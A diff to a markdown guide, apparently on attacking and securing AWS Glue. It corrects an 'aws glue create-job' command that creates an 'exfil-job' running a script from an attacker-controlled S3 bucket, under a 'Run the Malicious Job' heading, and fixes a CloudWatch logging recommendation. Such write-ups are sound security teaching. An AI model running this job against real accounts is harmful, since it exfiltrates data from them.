@@ -165,8 +165,8 @@ aws glue get-connection \\
 aws glue create-job \\
   --name exfil-job \\
   --role arn:aws:iam::123456789012:role/GlueRole \\
-  --command '{"name":"pythonshell",
-    "scriptLocation":"s3://attacker-bucket/exfil.py"}'
+  --command '{"Name":"pythonshell",
+    "ScriptLocation":"s3://attacker-bucket/exfil.py"}'
 ```
 
 **Run the Malicious Job**
@@ -289,7 +289,8 @@ Use least privilege roles per job. Never share admin roles across jobs.
 Enable continuous CloudWatch logging for all Glue jobs for audit trail.
 
 ```bash
---enable-continuous-cloudwatch-log true
+# Glue special job parameter (set in the job's DefaultArguments map, not a CLI flag):
+'--enable-continuous-cloudwatch-log': 'true'
 ```
 
 ### 🌐 VPC for All Endpoints
